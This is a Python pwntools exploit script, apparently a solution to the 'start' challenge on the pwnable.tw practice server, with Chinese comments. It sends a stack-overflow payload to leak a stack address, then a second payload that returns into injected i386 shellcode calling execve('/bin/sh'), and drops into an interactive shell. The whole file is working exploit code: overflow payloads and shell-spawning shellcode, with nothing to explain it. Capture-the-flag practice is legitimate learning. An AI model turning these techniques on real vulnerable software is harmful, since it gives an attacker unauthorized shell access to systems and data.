# coding: utf-8
from pwn import *

# set target environment
context.arch      = 'i386'
context.os        = 'linux'
# context.word_size = 32

# context.log_level = "debug" # 打印调试信息
# context.log_level = "error" # 打印错误信息, 此时很多回显就看不到了


debug=0
if debug:
    p=process('./start')
    # p=process('',env={'LD_PRELOAD':'./libc.so'}) # 绑定libc
    context.log_level='debug'
    gdb.attach(p)
else:
    p=remote('chall.pwnable.tw', 10000)

# generate shellcode
shell_code = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

# stage 1 : leak stack address
log.info('Pwning start:')
p.recvuntil(':')
payload_1 = b'A' * 0x14 + p32(0x08048087)
p.send(payload_1)

# save addr
esp_addr = u32(p.recv(4))

# stage 2
payload_2 = b'a' * 0x14 + p32(esp_addr +0x14) + shell_code

p.send(payload_2)

p.interactive()
